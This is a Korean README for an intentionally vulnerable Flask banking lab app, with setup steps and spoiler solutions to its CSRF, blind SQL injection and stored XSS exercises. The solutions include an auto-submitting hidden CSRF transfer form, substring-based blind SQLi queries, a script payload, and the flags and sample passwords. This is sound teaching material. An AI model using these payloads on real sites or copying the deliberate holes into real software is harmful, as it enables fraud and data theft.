# 🏦 HallymBank — Flask 기반 보안 실습 웹 애플리케이션

> **교육용 실습 전용 프로젝트입니다.**  
> 절대 실제 서비스 환경에 절대 배포하거나 인터넷에 노출하지 마세요.  

---

>python 3.13.xx 버전에서는 실행이 안됩니다. 3.11.x 버전으로 설치해주세요!

## 🚀 실행 방법

### 🧭 프로젝트 내려받기
원하는 폴더로 이동
```
cd C:\Users\내이름\Desktop\Hallymbank
```

GitHub에서 프로젝트 클론
```
git clone https://github.com/mongttangtta/Hack-n-Learn.git
```

프로젝트 폴더로 이동
```
cd Hack-n-Learn
```

브랜치 변경
```
git fetch origin
git checkout Secure
```

폴더 구조가 아래처럼 보이면 정상
```
HallymBank/
├── SQLinjection/
│   ├── app.py
│   ├── init_db.py
│   ├── requirements.txt
│   ├── templates/
│   └── static/
├── XSS/
│   ├── app.py
│   ├── init_db.py
│   ├── requirements.txt
│   ├── templates/
│   └── static/
├── CSRF/
│   ├── app.py
│   ├── init_db.py
│   ├── requirements.txt
│   ├── templates/
│   └── static/
└── README.md
```
### 가상환경(venv) 만들기
Python 3.11.X 버전이 설치되어 있는지 확인 (예: Python 3.11.5 가 나오면 OK)
```
python --version
```

가상환경 생성
```
python -m venv venv
```

가상환경 활성화
```
venv\Scripts\activate
```

실행 후 프롬프트에 (venv) 표시가 보이면 성공
```
(venv) C:\Users\내이름\Desktop\HallymBank>
```

### 📦 의존성(Flask 등) 설치

프로젝트 폴더 안에는 requirements.txt 파일이 있음. 설치가 끝나면 “Successfully installed Flask…” 같은 메시지가 나와야 함.
```
pip install -r requirements.txt
```


### 🗄️ 데이터베이스 초기화

Flask 앱은 SQLite DB 파일(vuln_bank.db)을 사용하므로, 최초 실행 전 한 번 DB를 생성해줘야 함.
```
python init_db.py
```

정상이라면 아래 메시지가 표시됨:
```
DB initialized: vuln_bank.db
FLAG stored in flags table (NOT in posts).
```

→ 이제 같은 폴더에 vuln_bank.db 파일이 생긴 것을 확인.

### 🚀 Flask 서버 실행
```
python app.py
```

다음 메시지가 뜨면 성공:
```
 * Running on http://127.0.0.1:5000 (Press CTRL+C to quit)
```
### 🌐 브라우저로 접속

크롬 또는 엣지에서 아래 주소 입력:
```
http://127.0.0.1:5000
```

✅ 첫 화면: 공지사항 + 자유게시판이 보이면 정상 작동!


---
## ⚙️ 1. 작동 원리

이 프로젝트는 Flask 기반의 간단한 “은행 시뮬레이션 웹사이트”로,
**회원 로그인, 게시판, 송금, 공지사항 검색 기능, 글쓰기 기능**을 제공합니다.

보안 교육을 위해 일부 구문은 **의도적으로 취약하게 작성**되어 있습니다.  

### 취약한 부분
**SQL injection**
`/board/notice` 내 검색 기능에서 SQL구문으로 SQLinjcetion 취약점 발생.
**XSS**
`/board/free` 내 글쓰기 기능에서 script를 작성하면 XSS 취약점 발생.
**CSRF**
송금부분에서 사용자 몰래 송금이 되게끔 공격 html을 작성하면 CSRF 취약점 발생.

---

## 🧩 2. 기능 설명

| 기능 | 경로 | 설명 |
|------|------|------|
| 홈 | `/` | 공지사항과 자유게시판의 최신 글 목록 표시 |
| 로그인/로그아웃 | `/login`, `/logout` | 사용자 인증 (admin / alice / bob 샘플 계정) |
| 게시판 | `/board/<board>` | 공지사항(notice), 자유게시판(free) — 글 목록 및 검색 가능 |
| 글쓰기 | `/write` | 로그인 후 글 작성 가능 (admin만 공지 작성 가능) |
| 글삭제 | `/delete/<id>` | 작성자 또는 admin만 삭제 가능 (CSRF 토큰 검증) |
| 계좌정보 | `/account` | 현재 로그인한 사용자의 계좌 정보 조회 |
| 송금 | `/transfer` | 다른 사용자에게 금액 송금 (CSRF 토큰 검증) |
| DB 초기화 | `python init_db.py` | DB를 삭제하고 다시 생성 (FLAG 포함) |


---

## 🔍 각 취약점 정답(풀이) 보기

> ⚠️ 이 아래 내용은 **풀이과정** 입니다.  

---

<details>
  <summary><strong>🧊 CSRF – 송금 CSRF & Base64 FLAG</strong></summary>

### 1) 실습 환경 실행

```bash
cd CSRF
python init_db.py      # DB 초기화 (사용자, 게시글, FLAG(Base64) 세팅)
python app.py          # 서버 실행
```
브라우저에서 http://127.0.0.1:5000 접속.

### 2) 피해자 계정으로 로그인
bob / bob123 로 로그인  
→ 우측 “현재 로그인: bob” 이 보이면 OK.

### 3) 공격 페이지(attack.html) 작성
아무 폴더에 attack.html 생성

```html
<form id="f"
      action="http://127.0.0.1:5000/transfer"
      method="POST"
      target="hidden_iframe">
        <input type="hidden" name="receiver" value="admin">
        <input type="hidden" name="amount" value="100">
</form>

<script>
      // 페이지가 로드되면 폼 자동 제출 (은밀 실행)
      window.onload = function(){
        document.getElementById('f').submit();
      };
</script>
```

### 4) 공격 페이지 열기
```bash
python -m http.server 8000  # attack.html 있는 폴더에서
```
그리고 같은 브라우저에서 (이미 bob으로 로그인된 상태)  
http://127.0.0.1:8000/attack.html 접속  
크롬 브라우저에서 리디렉션이 차단되어있는 경우, 팝업창을 통해 리디렉션을 허용하고 다시 시도  
→ 자동으로 /transfer 로 POST 가 날아가고, 서버는 CSRF 공격 성공 처리.

### 5) FLAG(Base64) 확인 & 디코딩
HallymBank 탭의 결과 페이지에 다음과 같은 메시지가 뜬다.
```text
CSRF 공격 성공!
Base64(RkxBR3tDU1JGX0FUVEFDS19TVUNDRVNTfQ)
```

### 6) Base64 디코딩
1. 구글 검색창에 "Base64 디코딩" 검색
2. Base64 디코딩 사이트에 공격 성공 코드 복사 후 붙여넣기.
3. 결과 복사 후 FLAG형식에 맞게 입력

### 정답 : FLAG{CSRF_ATTACK_SUCCESS}  


</details>
<details>
  <summary><strong>🧮 SQL Injection – Boolean 기반 Blind SQLi</strong></summary>

### 1) 실습 환경 실행

```bash
cd SQLi
python init_db.py      # DB 초기화
python app.py          # 서버 실행
```
브라우저에서 http://127.0.0.1:5000 접속.

### 2) 아무 계정으로 로그인
alice / alice123 또는 bob / bob123 로 로그인  
→ 우측 “현재 로그인: bob” 이 보이면 OK.

### 3) 취약한 SQL구문 확인하기
공지사항의 검색창에 `1=1`(참) 과 `1=2`(거짓) 입력 후 결과 확인  
 → 결과 개수 차이가 나면 Boolean 기반 Blind 가능.

### 4) SQL 구문으로 FLAG 추출

```sql
(SELECT substr(flag,1,1) FROM flags) = 'F'
(SELECT substr(flag,1,2) FROM flags) = 'FL'
...
(SELECT substr(flag,1,18) FROM flags) = 'FLAG{HackAndLearn}'
```
1~N 번째 문자에 대해 이분 탐색 or 알파벳 하나씩 대입 → FLAG{...} 문자열이 완성되면 문제 해결.

### 정답 : FLAG{HackAndLearn}

</details>
  <details> <summary><strong>💥 XSS – 저장형 XSS & 세션 탈취 체험</strong></summary>

### 1) 실습 환경 실행
```bash
cd SQLi
python init_db.py      # DB 초기화
python app.py          # 서버 실행
```
브라우저에서 http://127.0.0.1:5000 접속.

### 2) 아무 계정으로 로그인
alice / alice123 또는 bob / bob123 로 로그인  
→ 우측 “현재 로그인: bob” 이 보이면 OK.

### 3) 자유게시판에 script 작성
글쓰기/댓글 입력에 다음과 같이 입력

제목 : (상관없음)
본문 : <script>alert('1');</script>

### 4) 작성한 글 읽기
alert가 실행되면서 숨겨져있던 flag가 보임

### 정답 : FLAG{CAUGHT_YOU_BUDDY}

</details> 



